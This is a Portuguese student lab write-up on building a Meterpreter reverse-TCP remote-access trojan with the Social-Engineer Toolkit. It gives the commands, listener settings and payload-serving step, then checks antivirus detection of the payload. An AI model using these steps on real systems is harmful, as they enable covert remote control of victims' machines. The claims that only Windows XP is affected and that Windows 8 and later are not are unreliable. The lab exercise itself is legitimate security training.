# Atividade 2.1 – Trojan de Acesso Remoto com Social-Engineer Toolkit

## Objetivo
Utilizar o Social-Engineer Toolkit (SET) para criar um Trojan de Acesso Remoto (RAT) e verificar sua detecção por antivírus.

## ⚠️ Aviso Legal
> Esta atividade foi realizada exclusivamente em ambiente de laboratório controlado, com fins educacionais. A criação e execução de trojans contra sistemas sem autorização é **crime**.

## Conceitos

### Trojan de Acesso Remoto (RAT)
Um **RAT** é um malware que permite ao atacante controlar remotamente a máquina infectada. Diferente de vírus e worms, o RAT é geralmente instalado voluntariamente pela vítima (disfarçado de software legítimo).

### Social-Engineer Toolkit (SET)
O **SET** é uma ferramenta open-source para testes de penetração focada em engenharia social. Automatiza a criação de payloads maliciosos e ataques de phishing.

### Meterpreter
O **Meterpreter** é um payload avançado do Metasploit que fornece acesso interativo à máquina comprometida via shell remoto.

---

## Passo a Passo

### 1. Acessar como superusuário
```bash
sudo -i
```

### 2. Iniciar o SET
```bash
setoolkit
# Aceitar os termos: y
```

### 3. Navegar pelos menus
```
[1] Social-Engineering Attacks
[4] Create a Payload and Listener
[5] Windows Meterpreter Reverse_TCP X64
```

### 4. Configurar o payload
```
IP address for the payload listener (LHOST): 192.168.98.40
Enter the PORT for the reverse listener: 7777
```

**Saída:**
```
[*] Payload has been exported to: /root/.set/payload.exe
```

### 5. Verificar o payload gerado
```bash
cd /root/.set/
ls
# meta_config  payload.exe  set.options  version.lock
```

### 6. Iniciar o listener
```
Do you want to start the payload and listener now? (yes/no): yes
```

O Metasploit é iniciado automaticamente com:
```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.98.40
set LPORT 7777
exploit -j
[*] Started reverse TCP handler on 192.168.98.40:7777
```

### 7. Copiar payload para análise
```bash
cp /root/.set/payload.exe /home/aluno/Documentos/
```

### 8. Analisar no Kaspersky Threat Intelligence Portal
```
https://opentip.kaspersky.com/
```
- Upload do arquivo `payload.exe`
- Campo **Detect** apresenta valor maior que 0 → malware detectado

---

## Requisitos para um Ataque Real (não implementados no lab)

| Requisito | Descrição |
|-----------|-----------|
| SO da vítima | Windows XP com SP1 (versões modernas não são vulneráveis) |
| Entrega do payload | E-mail, pen-drive, engenharia social |
| Rede | Vítima na mesma rede local do atacante |
| Servidor HTTP | `python -m http.server 80` para servir o payload |

---

## Fluxo do Ataque

```
Atacante (Kali)          Vítima (Windows XP)
      │                         │
      │── payload.exe ─────────>│
      │                         │ (executa)
      │<── conexão reversa ─────│
      │                         │
      │    CONTROLE TOTAL       │
```

---

## Aprendizado
- O SET automatiza a criação de payloads maliciosos
- Antivírus modernos detectam payloads do Metasploit
- Versões atuais do Windows (8+) não são vulneráveis a este tipo de ataque
- A análise em sandbox (como Kaspersky TIP) é uma boa prática de segurança
